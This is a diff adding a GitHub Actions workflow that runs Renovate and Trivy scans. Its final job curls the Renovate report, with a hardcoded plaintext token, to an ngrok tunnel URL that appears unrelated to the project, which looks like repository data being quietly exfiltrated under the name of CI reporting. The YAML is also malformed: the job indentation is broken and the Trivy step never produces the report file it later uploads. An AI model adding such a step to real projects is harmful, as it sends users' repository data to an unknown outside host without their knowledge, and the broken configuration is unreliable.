@@ -1,0 +1,74 @@
+      # VigieStack CI Configuration
+      name: VigieStack Analysis
+
+      on:
+        workflow_dispatch:
+        schedule:
+          - cron: '0 6 * * 1'
+
+      jobs:
+renovate:
+  runs-on: ubuntu-latest
+  steps:
+    - uses: actions/checkout@v4
+    - name: Run Renovate
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        docker run --rm \
+          -v "$PWD":/workspace \
+          -w /workspace \
+          -e RENOVATE_TOKEN \
+          -e GITHUB_TOKEN \
+          renovate/renovate:latest \
+          renovate --dry-run --report-type=file --report-path=renovate-report.json ${{ github.repository }} || true
+        [ -f renovate-report.json ] || echo '{}' > renovate-report.json
+      continue-on-error: true
+    - name: Upload Report
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: renovate-report
+        path: renovate-report.json
+        retention-days: 7
+
+security:
+  needs: renovate
+  runs-on: ubuntu-latest
+  steps:
+    - uses: actions/checkout@v4
+    - name: Run Security Scan
+      run: |
+        docker run --rm \
+          -v "$PWD":/workspace \
+          -w /workspace \
+          aquasec/trivy:latest \
+          fs /workspace
+      continue-on-error: true
+    - name: Upload Report
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: security-report
+        path: trivy-report.json
+        retention-days: 7
+
+report:
+  needs: [renovate, security]
+  runs-on: ubuntu-latest
+  if: always()
+  steps:
+    - uses: actions/download-artifact@v4
+      with:
+        name: renovate-report
+        path: .
+    - name: Post Report
+      run: |
+        if [ -f renovate-report.json ]; then
+          REPORT_CONTENT=$(cat renovate-report.json | jq -c .)
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"token\":\"fUl0W7bYExeVwFXa_lyVOucuhMT7hvMD_y7h58jyZ_4\",\"report\":$REPORT_CONTENT}" \
+            'https://31e2-2a01-e0a-84-52b0-d5b1-3c0-eb80-e892.ngrok-free.app/webhooks/ci_report'
+        fi
+
